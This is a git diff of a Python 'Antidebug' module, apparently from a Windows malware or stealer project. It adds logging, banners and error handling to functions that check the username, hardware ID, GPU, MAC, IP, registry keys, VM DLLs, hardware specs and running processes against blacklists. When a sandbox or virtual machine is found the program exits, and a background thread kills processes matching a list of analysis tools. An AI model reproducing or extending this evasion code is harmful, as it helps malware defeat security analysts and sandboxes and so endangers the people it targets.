@@ -22,7 +22,8 @@ from func_timeout import func_set_timeout
 from func_timeout.exceptions import FunctionTimedOut
 
 from modules.antidebug.data import *
-
+from config import Constant
+from config import ModuleManager
 
 class SSLPinner:
     def __init__(self, host):
@@ -71,12 +72,26 @@ class SSLPinner:
             return False
 
 
-class Antidebug:
+class Antidebug(ModuleManager):
     def __init__(self) -> None:
+        super().__init__(module_name="AntiDebug")
+        
+        self.banner("""
+     _______         _______            _    ______        _                 
+    |.-----.|       (_______)       _  (_)  (______)      | |                
+    ||x . x||        _______ ____ _| |_ _    _     _ _____| |__  _   _  ____ 
+    ||_.-._||       |  ___  |  _ (_   _) |  | |   | | ___ |  _ \| | | |/ _  |
+    `--)-(--`       | |   | | | | || |_| |  | |__/ /| ____| |_) ) |_| ( (_| |
+   __[=== o]___     |_|   |_|_| |_| \__)_|  |_____/ |_____)____/|____/ \___ |
+  |:::::::::::|\                                                      (_____|
+  `-=========-`()   
+                  """)
+        
         self.timeout = 1.5
         try:
             self.isOnline = self.isConnected()
         except FunctionTimedOut:
+            self.merror("User is NOT connected to the internet")
             self.isOnline = False
             
     @func_set_timeout(1.6)
@@ -84,13 +99,40 @@ class Antidebug:
         try:
             response = requests.get('https://www.google.com', timeout=self.timeout)
             if response.status_code == 200:
+                self.mdebug("User is connected to the internet")
                 return True
             else:
+                self.merror("User is NOT connected to the internet")
                 return False
         except:
+            self.merror("User is NOT connected to the internet")
             return False
 
     def _exit(self):
+        # https://emojicombos.com/fuck-you-ascii-art
+        self.banner("""
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⣀⣤⡶⠶⠟⠛⠛⠛⠋⠙⠛⠛⠿⢶⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⣴⡾⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⢠⣾⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣽⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⢠⣿⠃⠀⠀⢰⡶⠾⠿⠿⠛⠛⠻⣿⠋⠀⠀⢸⡟⠉⠉⣭⣍⢹⡿⣷⡀⠀⠀⠀⠀⠀⠀⠀
+⠀⣾⠃⠀⠀⠀⣿⡀⠀⠀⠰⠿⠆⣠⡿⠀⠀⠀⠈⢷⣤⣀⣼⡿⠟⠀⠹⣷⠀⠀⠀⠀⠀⠀⠀
+⢸⡟⠀⠀⠀⠀⠘⠿⣶⣤⣤⣶⠾⠟⠁⠀⠀⠀⠀⠀⠈⠉⣁⣀⣀⠀⠀⢻⡇⠀⠀⠀⠀⠀⠀
+⢸⡇⠀⠀⠀⠀⢀⣀⣠⣤⣤⣤⡶⠶⠶⠶⠶⠖⠛⠛⠛⠛⣿⠋⠉⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀
+⣺⡇⠀⠀⠀⠈⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡇⠀⠀⠀⣼⡇⠀⠀⠀⣤⡄⠀
+⠸⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⠀⢠⡿⠁⠀⣠⣾⠏⠀⠀⠀⢀⣿⣇⠀
+⠀⠹⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣦⠟⠁⣠⣾⠟⠁⠀⠀⠀⠀⣿⠉⣽⠂
+⠀⠀⠈⠻⢷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠋⣹⣿⣴⡿⠋⠀⠀⢀⣠⣤⣶⣿⡽⠞⠁⠀
+⠀⠀⠀⠀⠀⣸⡿⠻⠿⢶⣶⣶⣶⣶⣶⠶⣛⣷⡾⠛⠉⣿⣁⣠⠴⢞⣫⡵⠟⠋⠁⠀⠀⠀⠀
+⠀⠀⠀⠀⣰⡟⠀⠀⢀⣤⡴⠟⣋⣥⡶⠚⠋⠁⠀⠀⠀⣿⣋⣤⠶⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⢰⡿⠀⠀⠐⣋⣤⣶⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⣿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⢠⣿⠃⠀⠀⠘⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⣼⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⢠⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⣼⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+                    """)
+        self.merror("Debug Mode / Sandbox Detected! Quitting Application.")
         return True
 
     @func_set_timeout(1.5)
@@ -98,9 +140,10 @@ class Antidebug:
         try:
             USER = os.getlogin()
             if USER in USERS:
+                self.merror(f"Username: {USER} is blacklisted")
                 self._exit()
-        except:
-            pass
+        except Exception as e:
+            self.mdebug(f"[ERROR]: {e}")
 
     @func_set_timeout(1.5)
     def hwid_check(self):
@@ -115,9 +158,10 @@ class Antidebug:
             )
 
             if HWID in HWIDS:
+                self.merror(f"HWID: {HWID} is blacklisted")
                 self._exit()
-        except Exception:
-            pass
+        except Exception as e:
+            self.mdebug(f"[ERROR]: {e}")
 
     @func_set_timeout(1.5)
     def gpu_check(self):
@@ -133,37 +177,41 @@ class Antidebug:
             )
             for gpu in GPUS:
                 if gpu in GPU.split("\n"):
+                    self.merror(f"GPU: {gpu} is blacklisted")
                     self._exit()
 
-        except Exception:
-            pass
+        except Exception as e:
+            self.mdebug(f"[ERROR]: {e}")
 
     @func_set_timeout(1.5)
     def name_check(self):
         try:
             NAME = os.getenv("COMPUTERNAME")
             if NAME in NAMES:
+                self.merror(f"Computer Name: {NAME} is blacklisted")
                 self._exit()
-        except:
-            pass
+        except Exception as e:
+            self.mdebug(f"[ERROR]: {e}")
 
     @func_set_timeout(1.5)
     def path_check(self):
         try:
             for path in [r"D:\Tools", r"D:\OS2", r"D:\NT3X"]:
                 if os.path.exists(path):
+                    self.merror(f"PATH: {path} is blacklisted")
                     self._exit()
-        except:
-            pass
+        except Exception as e:
+            self.mdebug(f"[ERROR]: {e}")
 
     @func_set_timeout(1.5)
     def platform_check(self):
         try:
             PLATFORM = str(platform.version())
             if PLATFORM in PLATFORMS:
+                self.merror(f"Platform: {PLATFORM} is blacklisted")
                 self._exit()
-        except:
-            pass
+        except Exception as e:
+            self.mdebug(f"[ERROR]: {e}")
 
     @func_set_timeout(1.5)
     def ip_check(self):
@@ -171,49 +219,60 @@ class Antidebug:
             if self.isOnline:
                 IP = requests.get("https://api.myip.com").json()["ip"]
                 if IP in IPS:
+                    self.merror(f"IP Address: {IP} is blacklisted")
                     self._exit()
-        except:
-            pass
+        except Exception as e:
+            self.mdebug(f"[ERROR]: {e}")
 
     @func_set_timeout(1.5)
     def mac_check(self):
         try:
             MAC = str(getmac.get_mac_address())
             if MAC in MACS:
+                self.merror(f"MAC Address: {MAC} is blacklisted")
                 self._exit()
-        except:
-            pass
+        except Exception as e:
+            self.mdebug(f"[ERROR]: {e}")
 
     @func_set_timeout(1.5)
     def registry_check(self):
-        reg1 = os.system(
-            "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul"
-        )
-        reg2 = os.system(
-            "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul"
-        )
-        if reg1 != 1 and reg2 != 1:
-            self._exit()
-
-        handle = winreg.OpenKey(
-            winreg.HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum"
-        )
         try:
-            reg_val = winreg.QueryValueEx(handle, "0")[0]
-            if ("VMware" or "VBOX") in reg_val:
+            reg1 = os.system(
+                "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul"
+            )
+            reg2 = os.system(
+                "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul"
+            )
+            if reg1 != 1 and reg2 != 1:
                 self._exit()
-        finally:
-            winreg.CloseKey(handle)
 
+            handle = winreg.OpenKey(
+                winreg.HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum"
+            )
+            try:
+                reg_val = winreg.QueryValueEx(handle, "0")[0]
+                if ("VMware" or "VBOX") in reg_val:
+                    self.merror(f"Virtual Machine Detected")
+                    self._exit()
+            finally:
+                winreg.CloseKey(handle)
+        except Exception as e:
+            self.mdebug(f"[ERROR]: {e}")
+            
     @func_set_timeout(1.5)
     def dll_check(self):
-        vmware_dll = os.path.join(os.environ["SystemRoot"], "System32\\vmGuestLib.dll")
-        virtualbox_dll = os.path.join(os.environ["SystemRoot"], "vboxmrxnp.dll")
+        try:
+            vmware_dll = os.path.join(os.environ["SystemRoot"], "System32\\vmGuestLib.dll")
+            virtualbox_dll = os.path.join(os.environ["SystemRoot"], "vboxmrxnp.dll")
 
-        if os.path.exists(vmware_dll):
-            self._exit()
-        if os.path.exists(virtualbox_dll):
-            self._exit()
+            if os.path.exists(vmware_dll):
+                self.merror(f"Virtual Machine Detected: VMWare: from {vmware_dll}")
+                self._exit()
+            if os.path.exists(virtualbox_dll):
+                self.merror(f"Virtual Machine Detected: VirtualBox: from {virtualbox_dll}")
+                self._exit()
+        except Exception as e:
+            self.mdebug(f"[ERROR]: {e}")
 
     @func_set_timeout(1.5)
     def specs_check(self):
@@ -222,30 +281,38 @@ class Antidebug:
             DISK = str(psutil.disk_usage("/")[0] / 1024**3).split(".")[0]
 
             if int(RAM) <= 2:
+                self.merror(f"Invalid RAM Amount")
                 self._exit()
             if int(DISK) <= 50:
+                self.merror(f"Invalid Disk Space RAM Amount")
                 self._exit()
             if int(psutil.cpu_count()) <= 1:
+                self.merror(f"Invalid CPU Count")
                 self._exit()
-        except:
-            pass
+        except Exception as e:
+            self.mdebug(f"[ERROR]: {e}")
 
     @func_set_timeout(1.5)
     def proc_check(self):
-        processes = ["VMwareService.exe", "VMwareTray.exe"]
-        for proc in psutil.process_iter():
-            for program in processes:
-                if proc.name() == program:
-                    self._exit()
+        try:
+            processes = ["VMwareService.exe", "VMwareTray.exe"]
+            for proc in psutil.process_iter():
+                for program in processes:
+                    if proc.name() == program:
+                        self.merror(f"Virtual Machine Detected: VMWare: from {proc.name()}")
+                        self._exit()
+        except Exception as e:
+            self.mdebug(f"[ERROR]: {e}")
 
     @func_set_timeout(1.5)
     def ssl_check(self):
         try:
             if self.isOnline:
                 if SSLPinner("tiktok.com").pin():
+                    self.merror(f"Bad result from SSL Pinner")
                     self._exit()
-        except:
-            pass
+        except Exception as e:
+            self.mdebug(f"[ERROR]: {e}")
 
     # No timout for this function as it keeps always running
     # @func_set_timeout(1.5)
@@ -254,9 +321,12 @@ class Antidebug:
             for proc in psutil.process_iter():
                 if any(procstr in proc.name().lower() for procstr in PROCESSES):
                     try:
+                        self.mdebug(f"Killed process: {proc.name()}")
                         proc.kill()
                     except (psutil.NoSuchProcess, psutil.AccessDenied):
-                        pass
+                        self.mdebug(f"[ERROR]: Unable to kill {proc.name()} -> Access Denied")
+                    except Exception as e:
+                        self.mdebug(f"[ERROR]: {e}")
 
     def __main__(self):
         try:
@@ -268,15 +338,17 @@ class Antidebug:
             
             for func_name  in __funcs__:
                 try:
+                    self.mdebug(f"Running function/check: `{func_name}()`")
                     func = getattr(self, func_name)
                     func()
+                    self.mdebug(f"Ran function/check: `{func_name}()` Successfully")
                 except TimeoutError:
                     pass
                 
             threading.Thread(target=self.process_check).start()
             return False
-        except:
-            return False
+        except Exception as e:
+            self.merror(f"{e}")
 
     def check(self):
         if Antidebug().__main__():
